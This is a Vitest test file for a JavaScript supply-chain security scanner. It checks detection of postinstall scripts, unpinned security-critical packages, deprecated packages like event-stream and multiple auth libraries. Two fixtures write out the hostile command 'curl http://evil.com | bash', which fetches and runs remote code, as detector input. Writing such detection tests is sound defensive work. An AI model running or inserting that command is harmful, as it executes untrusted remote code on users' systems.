import { describe, it, expect, beforeEach, vi } from "vitest";
import { scanPostinstallScripts } from "../postinstall-scripts.js";
import { scanVersionRanges } from "../version-ranges.js";
import { scanDeprecatedPackages } from "../deprecated-packages-scanner.js";
import { scanMultipleAuthSystems } from "../multiple-auth-systems.js";
import { scanSuspiciousScripts } from "../suspicious-scripts.js";
import {
  parseLockfile,
  parsePackageJson,
  isVersionRange,
  getVersionRangeType,
} from "../lockfile-parser.js";
import { isDeprecated } from "../deprecated-packages.js";
import {
  isSecurityCritical,
  detectAuthLibraries,
  findSuspiciousPatterns,
} from "../security-critical-packages.js";
import type { ScanContext, RepoMeta, FileIndex, AstHelpers, FrameworkHints } from "../../types.js";

// Mock file utilities
vi.mock("../../../utils/file-utils.js", () => ({
  readFileSync: vi.fn(),
  fileExists: vi.fn(),
  resolvePath: (...paths: string[]) => paths.join("/"),
}));

import { readFileSync, fileExists } from "../../../utils/file-utils.js";

const mockReadFileSync = vi.mocked(readFileSync);
const mockFileExists = vi.mocked(fileExists);

/**
 * Create a mock scan context
 */
function createMockContext(repoMeta?: Partial<RepoMeta>): ScanContext {
  return {
    repoRoot: "/test/repo",
    fileIndex: {
      allSourceFiles: [],
      tsTsxFiles: [],
      configFiles: [],
      routeFiles: [],
      apiRouteFiles: [],
    } as FileIndex,
    repoMeta: {
      dependencies: {},
      devDependencies: {},
      framework: "next",
      hasTypeScript: true,
      hasNextAuth: false,
      hasPrisma: false,
      ...repoMeta,
    } as RepoMeta,
    helpers: {} as AstHelpers,
    frameworkHints: {
      isNext: true,
      isExpress: false,
      hasPrisma: false,
      hasNextAuth: false,
      hasMulter: false,
      hasFormidable: false,
    } as FrameworkHints,
  };
}

describe("Lockfile Parser Utilities", () => {
  describe("isVersionRange", () => {
    it("identifies caret ranges", () => {
      expect(isVersionRange("^1.0.0")).toBe(true);
    });

    it("identifies tilde ranges", () => {
      expect(isVersionRange("~1.0.0")).toBe(true);
    });

    it("identifies comparison ranges", () => {
      expect(isVersionRange(">=1.0.0")).toBe(true);
      expect(isVersionRange(">1.0.0")).toBe(true);
      expect(isVersionRange("<2.0.0")).toBe(true);
    });

    it("identifies OR ranges", () => {
      expect(isVersionRange("1.0.0 || 2.0.0")).toBe(true);
    });

    it("identifies wildcards", () => {
      expect(isVersionRange("*")).toBe(true);
      expect(isVersionRange("1.x")).toBe(true);
    });

    it("returns false for pinned versions", () => {
      expect(isVersionRange("1.0.0")).toBe(false);
      expect(isVersionRange("1.2.3")).toBe(false);
    });

    it("returns false for workspace protocol", () => {
      expect(isVersionRange("workspace:*")).toBe(false);
    });

    it("returns false for file/git references", () => {
      expect(isVersionRange("file:../local")).toBe(false);
      expect(isVersionRange("git+https://github.com/user/repo")).toBe(false);
    });
  });

  describe("getVersionRangeType", () => {
    it("identifies caret ranges", () => {
      expect(getVersionRangeType("^1.0.0")).toContain("caret");
    });

    it("identifies tilde ranges", () => {
      expect(getVersionRangeType("~1.0.0")).toContain("tilde");
    });

    it("identifies OR ranges", () => {
      expect(getVersionRangeType("1.0.0 || 2.0.0")).toContain("OR");
    });

    it("identifies wildcards", () => {
      expect(getVersionRangeType("*")).toContain("wildcard");
    });
  });
});

describe("Deprecated Packages", () => {
  describe("isDeprecated", () => {
    it("detects request package", () => {
      const result = isDeprecated("request");
      expect(result).toBeDefined();
      expect(result?.severity).toBe("high");
    });

    it("detects event-stream (supply chain attack)", () => {
      const result = isDeprecated("event-stream");
      expect(result).toBeDefined();
      expect(result?.severity).toBe("critical");
      expect(result?.advisory).toContain("Supply chain");
    });

    it("returns undefined for safe packages", () => {
      expect(isDeprecated("react")).toBeUndefined();
      expect(isDeprecated("next")).toBeUndefined();
    });
  });
});

describe("Security Critical Packages", () => {
  describe("isSecurityCritical", () => {
    it("identifies auth packages", () => {
      const result = isSecurityCritical("next-auth");
      expect(result).toBeDefined();
      expect(result?.category).toBe("auth");
    });

    it("identifies crypto packages", () => {
      const result = isSecurityCritical("bcrypt");
      expect(result).toBeDefined();
      expect(result?.category).toBe("crypto");
    });

    it("identifies validation packages", () => {
      const result = isSecurityCritical("zod");
      expect(result).toBeDefined();
      expect(result?.category).toBe("validation");
    });

    it("returns undefined for non-security packages", () => {
      expect(isSecurityCritical("lodash")).toBeUndefined();
      expect(isSecurityCritical("react")).toBeUndefined();
    });
  });

  describe("detectAuthLibraries", () => {
    it("detects NextAuth", () => {
      const result = detectAuthLibraries({ "next-auth": "^4.0.0" });
      expect(result).toContain("nextAuth");
    });

    it("detects Clerk", () => {
      const result = detectAuthLibraries({ "@clerk/nextjs": "^4.0.0" });
      expect(result).toContain("clerk");
    });

    it("detects multiple auth systems", () => {
      const result = detectAuthLibraries({
        "next-auth": "^4.0.0",
        "@clerk/nextjs": "^4.0.0",
      });
      expect(result).toContain("nextAuth");
      expect(result).toContain("clerk");
    });
  });

  describe("findSuspiciousPatterns", () => {
    it("detects curl pipe to bash", () => {
      const result = findSuspiciousPatterns("curl http://evil.com | bash");
      expect(result.length).toBeGreaterThan(0);
      expect(result[0].reason).toContain("Remote script");
    });

    it("detects eval", () => {
      const result = findSuspiciousPatterns("eval(code)");
      expect(result.length).toBeGreaterThan(0);
    });

    it("detects base64 decoding", () => {
      const result = findSuspiciousPatterns("base64 -d payload");
      expect(result.length).toBeGreaterThan(0);
    });

    it("returns empty for safe scripts", () => {
      const result = findSuspiciousPatterns("npm run build");
      expect(result).toHaveLength(0);
    });
  });
});

describe("VC-SUP-001: Postinstall Scripts", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("detects postinstall script", async () => {
    const packageJson = {
      name: "test",
      scripts: {
        postinstall: "node scripts/setup.js",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanPostinstallScripts(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].ruleId).toBe("VC-SUP-001");
    expect(findings[0].title).toContain("postinstall");
    expect(findings[0].severity).toBe("medium"); // node execution
  });

  it("detects suspicious postinstall with high severity", async () => {
    const packageJson = {
      name: "test",
      scripts: {
        postinstall: "curl http://evil.com | bash",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanPostinstallScripts(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("high");
    expect(findings[0].description).toContain("suspicious");
  });

  it("returns empty when no install scripts", async () => {
    const packageJson = {
      name: "test",
      scripts: {
        build: "tsc",
        test: "vitest",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanPostinstallScripts(context);

    expect(findings).toHaveLength(0);
  });
});

describe("VC-SUP-002: Version Ranges", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("detects unpinned security-critical packages", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "next-auth": "^4.0.0",
        bcrypt: "^5.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanVersionRanges(context);

    expect(findings.length).toBeGreaterThanOrEqual(2);
    expect(findings.every((f) => f.ruleId === "VC-SUP-002")).toBe(true);
    expect(findings.some((f) => f.title.includes("next-auth"))).toBe(true);
    expect(findings.some((f) => f.title.includes("bcrypt"))).toBe(true);
  });

  it("ignores pinned versions", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "next-auth": "4.24.5",
        bcrypt: "5.1.1",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanVersionRanges(context);

    expect(findings).toHaveLength(0);
  });

  it("lower severity for dev dependencies", async () => {
    const packageJson = {
      name: "test",
      dependencies: {},
      devDependencies: {
        "next-auth": "^4.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanVersionRanges(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("medium"); // Lowered from high
  });
});

describe("VC-SUP-003: Deprecated Packages", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("detects deprecated packages", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        request: "^2.88.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanDeprecatedPackages(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].ruleId).toBe("VC-SUP-003");
    expect(findings[0].title).toContain("request");
    expect(findings[0].severity).toBe("high");
  });

  it("detects supply chain attack packages as critical", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "event-stream": "3.3.6",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanDeprecatedPackages(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].severity).toBe("critical");
  });

  it("returns empty for safe packages", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        react: "^18.0.0",
        next: "^14.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanDeprecatedPackages(context);

    expect(findings).toHaveLength(0);
  });
});

describe("VC-SUP-004: Multiple Auth Systems", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("detects multiple auth systems", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "next-auth": "^4.0.0",
        "@clerk/nextjs": "^4.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanMultipleAuthSystems(context);

    expect(findings).toHaveLength(1);
    expect(findings[0].ruleId).toBe("VC-SUP-004");
    expect(findings[0].title).toContain("Multiple authentication systems");
  });

  it("does not flag jwt with single auth system", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "next-auth": "^4.0.0",
        jsonwebtoken: "^9.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanMultipleAuthSystems(context);

    expect(findings).toHaveLength(0);
  });

  it("returns empty for single auth system", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        "next-auth": "^4.0.0",
      },
    };

    mockReadFileSync.mockReturnValue(JSON.stringify(packageJson));
    mockFileExists.mockReturnValue(true);

    const context = createMockContext();
    const findings = await scanMultipleAuthSystems(context);

    expect(findings).toHaveLength(0);
  });
});

describe("VC-SUP-005: Suspicious Scripts in Dependencies", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("detects dependencies with install scripts from lockfile", async () => {
    // Mock package.json
    const packageJson = {
      name: "test",
      dependencies: {
        "suspicious-pkg": "1.0.0",
      },
    };

    // Mock pnpm-lock.yaml with hasInstallScript flag
    const pnpmLock = `
lockfileVersion: '6.0'
packages:
  /suspicious-pkg@1.0.0:
    resolution: {integrity: sha512-xxx}
    hasInstallScript: true
`;

    mockReadFileSync.mockImplementation((path: string) => {
      if (path.includes("package.json")) return JSON.stringify(packageJson);
      if (path.includes("pnpm-lock.yaml")) return pnpmLock;
      return null;
    });

    mockFileExists.mockImplementation((path: string) => {
      return path.includes("package.json") || path.includes("pnpm-lock.yaml");
    });

    const context = createMockContext();
    const findings = await scanSuspiciousScripts(context);

    expect(findings.length).toBeGreaterThanOrEqual(1);
    expect(findings[0].ruleId).toBe("VC-SUP-005");
  });

  it("skips known safe packages", async () => {
    const packageJson = {
      name: "test",
      dependencies: {
        bcrypt: "5.1.0",
        prisma: "5.0.0",
      },
    };

    const pnpmLock = `
lockfileVersion: '6.0'
packages:
  /bcrypt@5.1.0:
    resolution: {integrity: sha512-xxx}
    hasInstallScript: true
  /prisma@5.0.0:
    resolution: {integrity: sha512-xxx}
    hasInstallScript: true
`;

    mockReadFileSync.mockImplementation((path: string) => {
      if (path.includes("package.json")) return JSON.stringify(packageJson);
      if (path.includes("pnpm-lock.yaml")) return pnpmLock;
      return null;
    });

    mockFileExists.mockImplementation((path: string) => {
      return path.includes("package.json") || path.includes("pnpm-lock.yaml");
    });

    const context = createMockContext();
    const findings = await scanSuspiciousScripts(context);

    expect(findings).toHaveLength(0);
  });

  it("returns empty when no lockfile", async () => {
    const packageJson = {
      name: "test",
      dependencies: {},
    };

    mockReadFileSync.mockImplementation((path: string) => {
      if (path.includes("package.json")) return JSON.stringify(packageJson);
      return null;
    });

    mockFileExists.mockImplementation((path: string) => {
      return path.includes("package.json");
    });

    const context = createMockContext();
    const findings = await scanSuspiciousScripts(context);

    expect(findings).toHaveLength(0);
  });
});

describe("Lockfile Parsing", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  describe("parseLockfile", () => {
    it("parses pnpm-lock.yaml", () => {
      const packageJson = {
        dependencies: {
          lodash: "^4.17.21",
        },
      };

      const pnpmLock = `
lockfileVersion: '6.0'
packages:
  /lodash@4.17.21:
    resolution: {integrity: sha512-xxx}
`;

      mockReadFileSync.mockImplementation((path: string) => {
        if (path.includes("package.json")) return JSON.stringify(packageJson);
        if (path.includes("pnpm-lock.yaml")) return pnpmLock;
        return null;
      });

      mockFileExists.mockImplementation((path: string) => {
        return path.includes("pnpm-lock.yaml");
      });

      const result = parseLockfile("/test/repo");

      expect(result.type).toBe("pnpm");
      expect(result.packages.has("lodash")).toBe(true);
    });

    it("parses package-lock.json", () => {
      const packageJson = {
        dependencies: {
          lodash: "^4.17.21",
        },
      };

      const npmLock = JSON.stringify({
        name: "test",
        lockfileVersion: 3,
        packages: {
          "node_modules/lodash": {
            version: "4.17.21",
            resolved: "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
          },
        },
      });

      mockReadFileSync.mockImplementation((path: string) => {
        if (path.includes("package.json")) return JSON.stringify(packageJson);
        if (path.includes("package-lock.json")) return npmLock;
        return null;
      });

      mockFileExists.mockImplementation((path: string) => {
        return path.includes("package-lock.json");
      });

      const result = parseLockfile("/test/repo");

      expect(result.type).toBe("npm");
      expect(result.packages.has("lodash")).toBe(true);
    });

    it("returns none when no lockfile", () => {
      mockFileExists.mockReturnValue(false);
      mockReadFileSync.mockReturnValue(null);

      const result = parseLockfile("/test/repo");

      expect(result.type).toBe("none");
      expect(result.packages.size).toBe(0);
    });
  });
});

describe("Integration: All Supply Chain Scanners", () => {
  beforeEach(() => {
    vi.resetAllMocks();
  });

  it("comprehensive test with multiple issues", async () => {
    const packageJson = {
      name: "vulnerable-app",
      scripts: {
        postinstall: "node setup.js",
      },
      dependencies: {
        request: "^2.88.0", // deprecated
        "next-auth": "^4.0.0", // unpinned security-critical
        "@clerk/nextjs": "^4.0.0", // multiple auth
      },
    };

    mockReadFileSync.mockImplementation((path: string) => {
      if (path.includes("package.json")) return JSON.stringify(packageJson);
      return null;
    });

    mockFileExists.mockImplementation((path: string) => {
      return path.includes("package.json");
    });

    const context = createMockContext();

    // Run all scanners
    const [postinstall, versions, deprecated, multiAuth] = await Promise.all([
      scanPostinstallScripts(context),
      scanVersionRanges(context),
      scanDeprecatedPackages(context),
      scanMultipleAuthSystems(context),
    ]);

    // Should find postinstall script
    expect(postinstall.length).toBeGreaterThanOrEqual(1);

    // Should find unpinned next-auth
    expect(versions.some((f) => f.title.includes("next-auth"))).toBe(true);

    // Should find deprecated request
    expect(deprecated.some((f) => f.title.includes("request"))).toBe(true);

    // Should find multiple auth systems
    expect(multiAuth).toHaveLength(1);
  });
});
